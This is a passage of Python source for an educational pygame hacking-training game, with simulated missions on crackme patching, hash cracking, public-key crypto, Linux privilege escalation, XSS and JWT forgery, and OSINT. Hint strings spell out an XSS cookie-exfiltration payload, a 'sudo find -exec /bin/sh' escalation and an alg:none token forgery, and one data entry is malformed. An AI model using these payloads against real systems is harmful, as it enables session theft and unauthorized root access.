        elif s.phase=="done" and e.key in (pygame.K_RETURN,pygame.K_SPACE):
            s.finished=True; s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: CRACKME ZERO",s.game.score)
        cp=pygame.Rect(60,64,470,270)
        pygame.draw.rect(sf,(9,20,11),cp); pygame.draw.rect(sf,MDIM,cp,2)
        sf.blit(F_S.render("DISASSEMBLY / DECOMPILATION:",True,CYAN),(cp.x+10,cp.y+6))
        y=cp.y+30
        for ln in CRACKME_CODE:
            col=PALE
            if "return 0" in ln: col=DIMRED
            if "sum != 700" in ln: col=YELLOW
            if "return 1" in ln: col=GREEN
            if s.patched and "sum != 700" in ln: ln="    if (0)  /* patched: JNE -> NOP */   return 0;"
            sf.blit(F_T.render(ln,True,col),(cp.x+10,y)); y+=19
        vp=pygame.Rect(560,64,400,270)
        pygame.draw.rect(sf,(10,24,13),vp); pygame.draw.rect(sf,MDIM,vp,2)
        sf.blit(F_S.render("LIVE VALIDATOR",True,CYAN),(vp.x+12,vp.y+6))
        yy=vp.y+32
        for label,fn in s.RULES:
            ok=fn(s.key)
            col=GREEN if ok else (RED if s.key else GRAY)
            sf.blit(F_S.render(f"[{'PASS' if ok else 'fail'}] {label}",True,col),(vp.x+14,yy)); yy+=26
        sf.blit(F_M.render("KEY > "+s.key+("_" if blink_on(350) else " "),True,GREEN),(60,360))
        sf.blit(F_S.render("ENTER validate",True,GRAY),(60,392))
        if s.phase=="crack":
            n=sum(1 for _l,f in s.RULES if f(s.key))
            sf.blit(F_S.render(f"rules passing: {n}/6   (hint: try digits 4+8, letters TTTT)",True,YELLOW),(60,424))
        elif s.phase=="patch":
            pygame.draw.rect(sf,(10,24,13),(60,424,900,120)); pygame.draw.rect(sf,ORANGE,(60,424,900,120),2)
            sf.blit(F_B.render("KEY ACCEPTED",True,GREEN),(80,436))
            sf.blit(F_S.render("you satisfied the check. now try DELETING it:",True,PALE),(80,476))
            sf.blit(F_M.render("[P] patch JNE -> NOP (bypass everything)",True,YELLOW),(80,504))
            sf.blit(F_S.render("[ENTER] leave the binary alone",True,GRAY),(500,504))
        elif s.phase=="done":
            pygame.draw.rect(sf,(10,24,13),(60,424,900,110)); pygame.draw.rect(sf,GREEN,(60,424,900,110),2)
            sf.blit(F_B.render("CRACKED" if not s.patched else "PATCHED",True,GREEN),(80,436))
            sf.blit(F_S.render("one valid key = infinite keys (keygens)."+(
                "  or: no key needed at all -- you deleted the check." if s.patched else ""),True,PALE),(80,478))
            sf.blit(F_S.render("[ENTER] debrief",True,YELLOW),(80,508))
        s.radio.draw(sf,H-58)

class MissionHash(Mission):
    def __init__(s,game):
        s.game=game
        s.rows=[
         dict(user="alice",kind="md5",salt="",pw="Summer2024!",h=md5s("Summer2024!"),cracked=False),
         dict(user="bob",kind="md5",salt="",pw="Summer2024!",h=md5s("Summer2024!"),cracked=False),
         dict(user="carol",kind="md5",salt="",pw="hunter2",h=md5s("hunter2"),cracked=False),
         dict(user="dave",kind="md5",salt="",pw="letmein",h=md5s("letmein"),cracked=False),
         dict(user="mallory",kind="md5+salt",salt="s1L7y",pw="Summer2024!",h=md5s("s1L7ySummer2024!"),cracked=False),
         dict(user="eve",kind="md5+salt",salt="p3pp3r",pw="correcthorse",h=md5s("p3pp3rcorrecthorse"),cracked=False),
         dict(user="frank",kind="bcrypt",salt="",pw="P@ssw0rd",h="$2y$10$K1x9wQ...",cracked=False)]
        s.rainbow={p:md5s(p) for p in ["password","123456","qwerty","letmein","dragon",
                    "hunter2","summer2024!","Summer2024!","croissant42","pancake7",
                    "sunshine","princess","iloveyou","correcthorse"]}
        s.inp=""; s.msg="type a plaintext guess. the cracker checks the rainbow table first."
        s.busy=0.0
        s.quiz=None
        s.reuse=False; s.tried_bcrypt=False
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","a leak dump from the ransom crew. unsalted md5. i'm going to be sick.")
        s.radio.say(6.0,"PATCH","Rainbow tables first. Then watch what salt does.")
    def cracked_rows(s): return sum(1 for r in s.rows if r["cracked"] and r["kind"]!="bcrypt")
    def distinct(s): return len({r["pw"] for r in s.rows if r["cracked"] and r["kind"]!="bcrypt"})
    def update(s,dt):
        s.radio.update(dt)
        if s.busy>0:
            s.busy-=dt
            if s.busy<=0:
                s.busy=0; sfx("bad"); s.tried_bcrypt=True
                s.msg="bcrypt: no match. no shortcut. no table. (est: centuries @ this rig)   [Q] quiz when 3+ distinct cracked"
    def submit(s):
        g=s.inp.strip()
        if not g: return
        s.inp=""
        for r in s.rows:
            if r["cracked"]: continue
            if r["kind"]=="md5" and md5s(g)==r["h"]:
                r["cracked"]=True; sfx("ok")
                s.msg=f"[+] {r['user']}: CRACKED (rainbow table hit) -- password was '{r['pw']}'"
            elif r["kind"]=="md5+salt" and md5s(r["salt"]+g)==r["h"]:
                r["cracked"]=True; sfx("ok")
                s.msg=(f"[+] {r['user']}: cracked -- but only by hashing with HER salt."
                       "  a rainbow table can't precompute this.")
        if all(r["cracked"] for r in s.rows[:2]) and not s.reuse:
            s.reuse=True; s.game.score+=25
            s.msg+="   ** REUSE SPOTTED: alice & bob share a hash = same password (+25) **"
            sfx("ok2")
        s.busy=1.1; sfx("tick")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.quiz:
            s.quiz.key(e.key); return
        if e.key==pygame.K_RETURN and not s.busy: s.submit()
        elif e.key==pygame.K_q and s.distinct()>=3 and s.tried_bcrypt:
            QS=[dict(q="Q1 :: alice & bob share ONE hash. mallory used the SAME password but\nher hash is totally different. Why?",
                 opts=["Alice's client is buggy","Mallory's hash is salted -- per-row random salt changes the output",
                       "MD5 glitched","Different keyboard layouts"],a=1,
                 why="Salt: a random value hashed WITH the password makes every row unique."),
                dict(q="Q2 :: Why do defenders pick bcrypt over MD5 for password storage?",
                 opts=["Shorter output strings","bcrypt is deliberately slow + salted -- mass guessing becomes expensive",
                       "MD5 is illegal","bcrypt compresses better"],a=1,
                 why="MD5 computes in nanoseconds -- perfect for attackers. bcrypt/scrypt/argon2 add cost factors.")]
            s.quiz=QuizOverlay(QS,lambda c: s.finish(c)); sfx("ok")
        elif e.key==pygame.K_BACKSPACE: s.inp=s.inp[:-1]; sfx("key")
        elif e.unicode and ord(e.unicode)>=32 and len(s.inp)<28:
            s.inp+=e.unicode; sfx("key")
    def finish(s,c):
        s.earned=20*s.cracked_rows()+(25 if s.reuse else 0)+30*c
        if s.cracked_rows()>=4: s.game.achieve("rainbow")
        s.passed=c>=1 and s.distinct()>=3
        s.finished=True; s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: HASH ALLEY  (leak dump)",s.game.score)
        sf.blit(F_S.render(f"cracked rows: {s.cracked_rows()}/6    distinct passwords: {s.distinct()}"
                           f"    bcrypt tried: {'yes' if s.tried_bcrypt else 'no'}",True,YELLOW),(60,60))
        y=92
        for r in s.rows:
            col=GREEN if r["cracked"] else (PALE if r["kind"]!="bcrypt" else DIMRED)
            hashshow=r["h"] if r["kind"]!="bcrypt" else r["h"]+"  (slow, salted, tunable)"
            sf.blit(F_S.render(f"{r['user']:<9}{r['kind']:<10}",True,col),(60,y))
            sf.blit(F_T.render(hashshow if len(hashshow)<50 else hashshow[:50],True,col),(230,y-1))
            if r["cracked"]: sf.blit(F_S.render(f"'{r['pw']}'",True,GREEN),(720,y-2))
            elif r["kind"]=="bcrypt": sf.blit(F_S.render("UNCRACKABLE",True,DIMRED),(720,y-2))
            y+=34
        rb=pygame.Rect(60,y+8,W-120,120)
        pygame.draw.rect(sf,(10,24,13),rb); pygame.draw.rect(sf,MDIM,rb,2)
        sf.blit(F_S.render("RAINBOW TABLE (precomputed password -> md5): instant lookups",True,CYAN),(rb.x+10,rb.y+4))
        items=list(s.rainbow.items())[:14]
        for i,(p,h) in enumerate(items):
            col=GREEN if any(r["cracked"] and r["pw"]==p for r in s.rows) else GRAY
            sf.blit(F_T.render(f"{p} -> {h[:16]}..",True,col),(rb.x+12+(i%7)*128,rb.y+26+(i//7)*18))
        sf.blit(F_M.render("GUESS > "+s.inp+("_" if blink_on(350) else " "),True,GREEN),(60,H-118))
        if s.busy>0: sf.blit(F_M.render("bcrypt(cost=10) evaluating ... one slow hash at a time",True,CYAN),(60,H-88))
        draw_lines(sf,wrap(s.msg,F_S,W-140),F_S,YELLOW,60,H-64,19)
        if s.quiz: s.quiz.draw(sf)
        s.radio.draw(sf,H-88)

class MissionSeal(Mission):
    STEPS=[
     ("KIP wants to send you a SECRET plan file. Whose key ENCRYPTS it?",
      ["your PRIVATE key","your PUBLIC key","KIP's PRIVATE key","PATCH's PUBLIC key"],1,
      "Encrypt to the RECIPIENT'S PUBLIC key. Only your private key opens it."),
     ("KIP must PROVE the file really came from her. What does she sign with?",
      ["her PUBLIC key","your PUBLIC key","her PRIVATE key","a shared password"],2,
      "Sign with the SENDER'S PRIVATE key. ENCRYPT-TO-PUB, SIGN-WITH-PRIV."),
     ("A message arrives: 'abort the op. -PATCH'. Verified with PATCH's public key: INVALID. What do you know?",
      ["Patch never sent anything ever","The signer held a DIFFERENT private key -- possibly forged",
       "Patch's private key leaked for sure","Signatures are decorative"],1,
      "Invalid under Patch's key = whoever signed did NOT hold Patch's private key. Next question: WHO did?"),
     ("You verify the same message with ORION's public key: VALID. So the message...",
      ["Is from Patch after all","Really came from ORION's key -- a signature identifies a KEY, not a person",
       "Proves crypto is broken","Is encrypted"],1,
      "Signatures bind to key pairs, not humans. 'Signed PATCH' is a CLAIM."),
     ("The LIGHTHOUSE CA issues: 'this key belongs to PATCH'. Orion's forgery is now...",
      ["Still valid -- crypto is broken","Detectable: the certificate binds key->identity; his key has no such cert",
       "Legal","Fixed by longer keys"],1,
      "That's PKI: Certificate Authorities vouch for key->identity. Your browser checks this on every HTTPS site."),
     ("Send KIP the 1.2GB BLACKBIRD plans -- encrypted AND signed. Best approach?",
      ["RSA-encrypt the whole file with her public key",
       "Hybrid: AES session key for the file, RSA-wrap the AES key, sign a hash",
       "Plaintext + signature is enough","ZIP with password 'pony'"],1,
      "RSA is SLOW. AES for bulk; asymmetric only wraps the key + signs a hash."),
     ("ORION steals your PRIVATE key tomorrow. What breaks?",
      ["People can still encrypt to you","Your signatures -- and anyone can impersonate you going forward",
       "Nothing, keys are public","Only old messages"],1,
      "Private key = your identity. Rotate + revoke via the CA. Never in git, never in screenshots."),
    ]
    KEYS=[("YOU+ (public)",CYAN),("YOU- (private)",GREEN),("PATCH+ (public)",PALE),
          ("KIP+ (public)",PALE),("ORION+ (public)",DIMRED)]
    def __init__(s,game):
        s.game=game; s.i=0; s.pick=None
        s.correct=0; s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","hashes prove integrity. today: SECRECY and IDENTITY.")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.pick is not None:
            if e.key in (pygame.K_SPACE,pygame.K_RETURN):
                s.pick=None; s.i+=1
                if s.i>=len(s.STEPS):
                    s.earned=20*s.correct+(30 if s.correct>=6 else 0)
                    s.passed=s.correct>=5
                    if s.correct==7: s.game.achieve("keymaster")
                    s.game.achieve("first_blood")
                    s.finished=True
            return
        if pygame.K_1<=e.key<=pygame.K_4:
            q,opts,ans,_=s.STEPS[s.i]
            ok=(e.key-pygame.K_1)==ans
            if ok: s.correct+=1
            sfx("ok" if ok else "bad"); s.pick=(ok,e.key-pygame.K_1)
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: SEAL & SIGN",s.game.score)
        kb=pygame.Rect(60,70,300,220)
        pygame.draw.rect(sf,(10,24,13),kb); pygame.draw.rect(sf,MDIM,kb,2)
        sf.blit(F_S.render("KEYRING",True,CYAN),(kb.x+10,kb.y+6))
        for j,(name,col) in enumerate(s.KEYS):
            sf.blit(F_S.render(("  * " if j==1 else "    ")+name,True,col),(kb.x+10,kb.y+30+j*30))
        sf.blit(F_T.render("* private key: never leaves",True,GRAY),(kb.x+10,kb.bottom-22))
        q,opts,ans,_=s.STEPS[s.i]
        qb=pygame.Rect(390,70,W-450,420)
        pygame.draw.rect(sf,(10,24,13),qb); pygame.draw.rect(sf,CYAN,qb,2)
        sf.blit(F_S.render(f"SCENARIO {s.i+1}/{len(s.STEPS)}    correct: {s.correct}",True,YELLOW),(qb.x+16,qb.y+8))
        draw_lines(sf,wrap(q,F_M,qb.w-40),F_M,PALE,qb.x+16,qb.y+36,25)
        y=qb.y+130
        for j,opt in enumerate(opts):
            col=GREEN
            if s.pick is not None:
                if j==ans: col=GREEN
                elif j==s.pick[1]: col=RED
                else: col=GRAY
            sf.blit(F_M.render(f"[{j+1}] {opt}",True,col),(qb.x+24,y))
            y+=34
        if s.pick is not None:
            ok=s.pick[0]
            c2=GREEN if ok else RED
            sf.blit(F_M.render("CORRECT!" if ok else "WRONG!",True,c2),(qb.x+16,qb.bottom-150))
            draw_lines(sf,wrap(s.STEPS[s.i][3],F_S,qb.w-40),F_S,PALE,qb.x+16,qb.bottom-120,19)
            sf.blit(F_S.render("SPACE next",True,GRAY),(qb.right-110,qb.bottom-26))
        sf.blit(F_S.render("answer 1-4",True,GRAY),(60,320))
        if s.i==0: sf.blit(F_S.render("cheat: public = padlock anyone can close. private = the only key.",True,GRAY),(60,344))
        s.radio.draw(sf,H-58)

class MissionPrivesc(Mission):
    DIRS={"/opt/scripts":["-rwxrwxrwx root root  backup.sh","-rw-r--r-- root root  notes.txt"],
          "/usr/local/bin":["-rwsr-xr-x root root  statuscheck","drwxrwxrwx root root  ."],
          "/home/intern":[".bashrc","todo.txt"],"/etc":["passwd","sudoers (read denied)"],
          "/usr/bin":["-rwsr-xr-x root root passwd","-rwxr-xr-x root root find","..."]}
    FILES={"/opt/scripts/backup.sh":"#!/bin/sh\ntar czf /var/backups/home.tgz /home\n# runs as ROOT every minute (root's crontab)\n# (perms: rwxrwxrwx -- oops)",
     "/opt/scripts/notes.txt":"cron re-runs this every minute. don't edit. -- admin\n(editor note: everyone can edit)",
     "/usr/local/bin/statuscheck":"#!/bin/sh  (SUID root)\n# calls the 'service' command BY NAME:\nservice --status-all\n# 'service' is not in /usr/local/bin ... yet.",
     "/home/intern/todo.txt":"- find out why my shell is so limited\n- ask admin for sudo\n- name the goldfish"}
    SUDO_L="Matching Defaults: env_reset\nUser intern may run the following commands on staging:\n  (root) NOPASSWD: /usr/bin/find"
    SUID=["/usr/bin/passwd","/usr/local/bin/statuscheck"]
    def __init__(s,game):
        s.game=game
        s.hist=[]; s.inp=""; s.cmd_hist=[]; s.ch_i=0
        s.priv="intern"; s.paths=set(); s.cron_taint=False; s.service_planted=False
        s.done=False
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"PATCH","Low-priv shell. The data needs ROOT. Escalate.")
        s.radio.say(5.5,"KIP","recon first!! 'sudo -l' and 'find' are your flashlights.")
        s.out("V0IDRAT staging box -- shell as 'intern' (uid=1000)",CYAN)
        s.out("type 'hint' for a nudge, 'sudo -l' to start recon.",GRAY)
    def out(s,t,c=PALE,sn=None):
        s.hist.append((t,c))
        if len(s.hist)>200: del s.hist[:60]
        if sn: sfx(sn)
    def escalate(s,path):
        if s.priv=="root": return
        s.paths.add(path); s.priv="root"; sfx("win")
        if len(s.paths)>=3: s.game.achieve("root")
        s.out("")
        s.out("[!] euid set to 0. you are ROOT. path used: "+path,ORANGE)
        s.out("    each DISTINCT escalation path = +60. find more, or type 'done'.",PALE)
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.done:
            if e.key in (pygame.K_RETURN,pygame.K_SPACE):
                s.earned=60*len(s.paths)+40; s.passed=True; s.finished=True
                s.game.achieve("first_blood")
            return
        if e.key==pygame.K_RETURN:
            line=s.inp.strip(); s.inp=""
            s.out("intern@staging:"+("$" if s.priv!="root" else "#")+" "+line,MDIM)
            if line: s.cmd_hist.append(line)
            s.ch_i=len(s.cmd_hist)
            s.exec_cmd(line)
        elif e.key==pygame.K_BACKSPACE: s.inp=s.inp[:-1]; sfx("key")
        elif e.key==pygame.K_UP:
            if s.cmd_hist: s.ch_i=max(0,s.ch_i-1); s.inp=s.cmd_hist[s.ch_i]
        elif e.key==pygame.K_DOWN:
            s.ch_i=min(len(s.cmd_hist),s.ch_i+1)
            s.inp=s.cmd_hist[s.ch_i] if s.ch_i<len(s.cmd_hist) else ""
        elif e.unicode and ord(e.unicode)>=32 and len(s.inp)<70:
            s.inp+=e.unicode; sfx("key")
    def exec_cmd(s,line):
        parts=line.split()
        if not parts: return
        cmd=parts[0].lower()
        if cmd=="hint":
            s.out("paths: (1) sudo -l -> GTFOBins binary + -exec",YELLOW)
            s.out("       (2) writable root cron script: /opt/scripts/backup.sh",YELLOW)
            s.out("       (3) SUID 'statuscheck' calls 'service' by NAME --",YELLOW)
            s.out("           plant your own in the writable PATH dir.",YELLOW)
        elif cmd=="done" and s.priv=="root": s.done=True
        elif cmd=="id":
            s.out(f"uid={0 if s.priv=='root' else 1000}({s.priv}) gid=1000(intern)",PALE)
        elif cmd=="sudo":
            if len(parts)<2: s.out("usage: sudo <cmd>",GRAY); return
            sub=" ".join(parts[1:]).lower()
            if sub.startswith("-l"):
                s.out(s.SUDO_L,YELLOW)
                s.out("  ^ GTFOBins alert: find can spawn shells (-exec).",DIMRED)
            elif "find" in sub:
                if "exec" in sub and "sh" in sub: s.escalate("sudo find -exec")
                else:
                    s.out("find runs as ROOT... and find can run commands:",PALE)
                    s.out("  try:  sudo find . -exec /bin/sh \\",GRAY)
            else: s.out("sudo: sorry, you can only run /usr/bin/find.",RED)
        elif cmd=="ls":
            d=parts[1] if len(parts)>1 else "/home/intern"
            if d in s.DIRS:
                for f in s.DIRS[d]: s.out("  "+f,PALE)
            elif d=="/": s.out("  bin  etc  home  opt  tmp  usr  var",PALE)
            else: s.out(f"ls: cannot access '{d}'",RED)
        elif cmd=="cat":
            if len(parts)<2: s.out("usage: cat <file>",GRAY); return
            f=parts[1]
            if f in s.FILES:
                for ln in s.FILES[f].split("\n"): s.out("  | "+ln,PALE)
            elif "sudoers" in f: s.out("cat: permission denied (you are not root... yet)",RED)
            else: s.out(f"cat: {f}: No such file",RED)
        elif cmd=="find":
            s.out("SUID binaries:",CYAN)
            for f in s.SUID: s.out("  "+f,YELLOW)
            s.out("  (statuscheck is SUID root. inspect it: cat /usr/local/bin/statuscheck)",GRAY)
        elif cmd=="echo":
            if ">" in line:
                left,right=line.split(">",1)
                path=right.strip()
                s.out(f"wrote {len(left)} bytes -> {path}",PALE)
                if path=="/opt/scripts/backup.sh":
                    s.cron_taint=True
                    s.out("backup.sh MODIFIED. cron runs it as root every minute.",YELLOW)
                    s.out("  'cronwait' to wait for the tick.",GRAY)
                elif path=="/usr/local/bin/service":
                    s.service_planted=True
                    s.out("fake 'service' planted in the writable PATH dir.",YELLOW)
                    s.out("  run 'statuscheck' -- it calls 'service' by NAME as root.",GRAY)
                else: s.out("(saved. probably useless.)",GRAY)
        elif cmd=="cronwait":
            if s.cron_taint: s.escalate("writable cron script")
            else: s.out("cron tick: nothing tainted. (edit /opt/scripts/backup.sh first)",GRAY)
        elif cmd=="statuscheck":
            if s.service_planted: s.escalate("PATH hijack on SUID")
            else: s.out("statuscheck: 'service' not found. hmm. what PATH is this?",PALE)
        elif cmd=="clear": s.hist.clear()
        else: s.out(f"{cmd}: command not found",RED)
    def update(s,dt): s.radio.update(dt)
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: ROOT OF ALL EVIL  (staging box)",s.game.score)
        col=RED if s.priv=="root" else CYAN
        sf.blit(F_M.render(f"PRIV: {s.priv}",True,col),(760,60))
        sf.blit(F_S.render(f"escalations found: {len(s.paths)}/3",True,YELLOW),(760,88))
        box=pygame.Rect(40,92,700,H-150)
        pygame.draw.rect(sf,(9,20,11),box); pygame.draw.rect(sf,MDIM,box,2)
        lh=19; show=s.hist[-((box.h-14)//lh):]
        y=box.y+6
        for t,c in show: sf.blit(F_T.render(t[:100],True,c),(box.x+8,y)); y+=lh
        sf.blit(F_T.render("intern@staging:"+("$" if s.priv!="root" else "#")+" ",True,MDIM),(box.x+8,box.bottom-24))
        sf.blit(F_T.render(s.inp+("_" if blink_on(350) else " "),True,GREEN),(box.x+8+F_T.size("intern@staging:$ ")[0],box.bottom-24))
        hb=pygame.Rect(760,120,220,180)
        pygame.draw.rect(sf,(10,24,13),hb); pygame.draw.rect(sf,MDIM,hb,2)
        sf.blit(F_S.render("RECON CHEATS",True,CYAN),(hb.x+10,hb.y+6))
        for i,t in enumerate(["id","sudo -l","ls /opt/scripts","cat /usr/local/bin/","  statuscheck","find","echo x > file","cronwait","hint"]):
            sf.blit(F_T.render("  "+t,True,PALE),(hb.x+8,hb.y+28+i*17))
        if s.done:
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,160)); sf.blit(ov,(0,0))
            sf.blit(F_H.render("euid = 0",True,GREEN),(W//2-140,260))
            sf.blit(F_M.render(f"{len(s.paths)} distinct escalation path(s). [ENTER] debrief",True,PALE),(W//2-220,330))
        s.radio.draw(sf,H-58)

class MissionToken(Mission):
    HINTS=["1. the comment box renders HTML -- <script> tags RUN in the admin's browser",
           "2. exfil: <script>fetch('http://you/?c='+document.cookie)</script>",
           "3. replay the cookie to wear their session (ENTER on the replay screen)",
           "4. JWT: header alg:none, DELETE the signature, payload role:admin"]
    def __init__(s,game):
        s.game=game
        s.phase="xss"
        s.comment=""; s.collector=[]; s.victim_msg=""
        s.fields=['{"alg":"HS256"}','{"role":"support"}',"SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV"]
        s.focus=0; s.hint_i=-1
        s.server_msg=""; s.forge_done=False
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","their comment box renders HTML. of course it does.")
    def norm(s,x): return x.replace(" ","").replace("'","\"").lower()
    def post_comment(s):
        c=s.comment.strip(); s.comment=""
        if not c: return
        low=c.lower()
        if "<script" in low and "document.cookie" in low:
            if not s.collector:
                s.collector.append("sessionid=K1P-5E4S-10N; role=support")
                sfx("win")
            s.victim_msg="admin's browser executed your script. cookie exfiltrated."
            s.phase="replay"
        elif "<script" in low:
            s.victim_msg="script ran... and did nothing useful. (hint: document.cookie)"
            sfx("bad")
        else:
            s.victim_msg="admin read your comment. described it as 'fine'. no code ran."
            sfx("tick")
    def submit_token(s):
        hdr,pay,sig=[s.norm(f) for f in s.fields]
        admin='"role":"admin"' in pay
        none_alg='"alg":"none"' in hdr
        if none_alg and sig=="" and admin:
            s.server_msg="[200] welcome, ADMIN. (the lib trusted the header. the header lied.)"
            s.forge_done=True; sfx("win"); s.game.achieve("first_blood")
        elif none_alg and sig!="":
            s.server_msg="[400] alg:none WITH a signature? pick a lie."; sfx("bad")
        elif admin and sig!="":
            s.server_msg="[401] signature invalid -- this server signs its tokens properly."; sfx("bad")
        elif none_alg and sig=="":
            s.server_msg="[200] alg:none accepted(!!) ... but you're still 'support'."; sfx("bad")
        else:
            s.server_msg="[200] valid token. role: support. the admin panel stays shut."; sfx("tick")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="xss":
            if e.key==pygame.K_RETURN: s.post_comment()
            elif e.key==pygame.K_h: s.hint_i=(s.hint_i+1)%2
            elif e.key==pygame.K_BACKSPACE: s.comment=s.comment[:-1]; sfx("key")
            elif e.unicode and ord(e.unicode)>=32 and len(s.comment)<70: s.comment+=e.unicode; sfx("key")
        elif s.phase=="replay":
            if e.key in (pygame.K_RETURN,pygame.K_SPACE):
                s.phase="forge"; sfx("ok")
                s.server_msg="session accepted -- role: SUPPORT. admin panel requires a token. forge one."
        elif s.phase=="forge":
            if e.key==pygame.K_TAB: s.focus=(s.focus+1)%3
            elif e.key==pygame.K_h: s.hint_i=(s.hint_i+1)%len(s.HINTS)
            elif e.key==pygame.K_RETURN: s.submit_token()
            elif e.key==pygame.K_BACKSPACE: s.fields[s.focus]=s.fields[s.focus][:-1]; sfx("key")
            elif e.unicode and ord(e.unicode)>=32 and len(s.fields[s.focus])<60:
                s.fields[s.focus]+=e.unicode; sfx("key")
        elif s.phase=="done":
            if e.key in (pygame.K_RETURN,pygame.K_SPACE):
                s.earned=150 if s.forge_done else 0; s.passed=s.forge_done; s.finished=True
    def update(s,dt):
        s.radio.update(dt)
        if s.phase=="forge" and s.forge_done: s.phase="done"
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: TOKEN HEIST  (V0IDRAT support portal)",s.game.score)
        if s.phase=="xss":
            sf.blit(F_B.render("STAGE 1/3 :: THE COMMENT BOX (XSS)",True,GREEN),(60,64))
            sf.blit(F_S.render("this comment renders as HTML in the ADMIN's browser. craft code.",True,GRAY),(60,100))
            box=pygame.Rect(60,124,W-120,52)
            pygame.draw.rect(sf,(10,24,13),box); pygame.draw.rect(sf,MDIM,box,2)
            sf.blit(F_M.render(s.comment+("_" if blink_on(350) else " "),True,RED),(box.x+10,box.y+14))
            sf.blit(F_S.render("ENTER post comment   H hint",True,GRAY),(60,186))
            prev=pygame.Rect(60,210,W-120,110)
            pygame.draw.rect(sf,(9,20,11),prev); pygame.draw.rect(sf,DIMRED,prev,2)
            sf.blit(F_S.render("VICTIM'S BROWSER (what runs):",True,CYAN),(prev.x+10,prev.y+6))
            if s.comment:
                sf.blit(F_S.render(s.comment[:86],True,PALE),(prev.x+10,prev.y+28))
                if "<script" in s.comment.lower():
                    sf.blit(F_S.render("  -> script executes in admin's page context",True,ORANGE),(prev.x+10,prev.y+50))
            if s.victim_msg: sf.blit(F_S.render(s.victim_msg,True,YELLOW),(60,330))
            if s.collector:
                sf.blit(F_S.render("collect cookie -> [ENTER] replay the session",True,GREEN),(60,356))
        elif s.phase=="replay":
            sf.blit(F_B.render("STAGE 2/3 :: SESSION REPLAY",True,GREEN),(60,64))
            for i,c in enumerate(s.collector): sf.blit(F_M.render("cookie: "+c,True,ORANGE),(60,110+i*26))
            sf.blit(F_M.render("[ENTER] wear their session",True,YELLOW),(60,190))
        elif s.phase=="forge":
            sf.blit(F_B.render("STAGE 3/3 :: FORGE THE JWT",True,GREEN),(60,64))
            sf.blit(F_S.render("header.payload.SIGNATURE -- the signature binds the claims. or does it?",True,GRAY),(60,100))
            labels=("HEADER (alg)","PAYLOAD (claims)","SIGNATURE")
            for i,(lab,val) in enumerate(zip(labels,s.fields)):
                y=140+i*46
                sf.blit(F_S.render(lab,True,CYAN),(60,y))
                r=pygame.Rect(240,y-4,W-320,36)
                pygame.draw.rect(sf,(10,24,13),r)
                pygame.draw.rect(sf,YELLOW if s.focus==i else MDIM,r,2)
                col=RED if (i==2 and not s.fields[i].strip()) else GREEN
                sf.blit(F_S.render(val if len(val)<64 else val[:64],True,col),(r.x+8,r.y+8))
            sf.blit(F_S.render("TAB field   ENTER submit   H hint   (empty signature = delete it)",True,GRAY),(60,290))
            if s.server_msg: draw_lines(sf,wrap(s.server_msg,F_M,W-140),F_M,YELLOW,60,320,24)
            if s.hint_i>=0: sf.blit(F_S.render("HINT: "+s.HINTS[s.hint_i],True,ORANGE),(60,392))
        elif s.phase=="done":
            sf.blit(F_B.render("ADMIN ACCESS GRANTED",True,GREEN),(60,64))
            sf.blit(F_S.render("[ENTER] debrief",True,YELLOW),(60,110))
        cb=pygame.Rect(660,470,320,140)
        pygame.draw.rect(sf,(10,24,13),cb); pygame.draw.rect(sf,MDIM,cb,2)
        sf.blit(F_S.render("COLLECTOR",True,CYAN),(cb.x+10,cb.y+6))
        for i,c in enumerate(s.collector[:5]):
            sf.blit(F_T.render(c[:44],True,ORANGE),(cb.x+10,cb.y+28+i*18))
        s.radio.draw(sf,H-58)

OSINT_POSTS=[
 ("2h","#dogdad Biscuit's 3rd birthday!! he got a PUPCAKE. best boy."),
 ("1d","throwback: springfield elementary, grade 2. wild hair, don't care."),
 ("2d","grandma baker & mom carol -- three generations of bakers!!"),
 ("3d","new espresso machine. life complete. #latteart"),
 ("4d","gym PR! 120kg deadlift. beasts only."),
 ("5d","PSA my password hint is 'my dog' so I never forget lol #security"),
 ("6d","CrumbCorp Q3: we're winning the contracts that matter ;)",
 "1w","voted at lincoln high again. springfield forever!")]
OSINT_QS=[
 dict(q="RECOVERY Q1 :: Name of his first pet?",opts=["Muffin","Waffles","Biscuit","Rex"],a=2,
      why="Post 1: 'Biscuit's 3rd birthday'. Post 6 even says his password hint is 'my dog'."),
 dict(q="RECOVERY Q2 :: What ELEMENTARY school did he attend?",opts=["Westbrook High","Springfield Elementary","Lincoln High","St. Mary's"],a=1,
      why="Post 2: 'springfield elementary, grade 2'. Lincoln High is just where he votes (post 8)."),
 dict(q="RECOVERY Q3 :: His MOTHER'S maiden name?",opts=["Carol","Mallow","Pudding","Baker"],a=3,
      why="Post 3: 'grandma baker & mom carol' -- nee Baker. Carol is her FIRST name, not the answer."),
]
class MissionOsint(Mission):
    def __init__(s,game):
        s.game=game; s.qi=0; s.correct=0; s.feedback=None
        s.phase="quiz"
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"PATCH","No exploits today. He posts his whole life. Read it.")
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="quiz":
            q=OSINT_QS[s.qi]
            if s.feedback is not None:
                if e.key in (pygame.K_SPACE,pygame.K_RETURN):
                    s.feedback=None; s.qi+=1
                    if s.qi>=len(OSINT_QS):
                        s.earned=30*s.correct+(30 if s.correct==3 else 0)
                        s.passed=s.correct>=2; s.phase="reset"
                        s.game.achieve("first_blood")
            elif pygame.K_1<=e.key<=pygame.K_4:
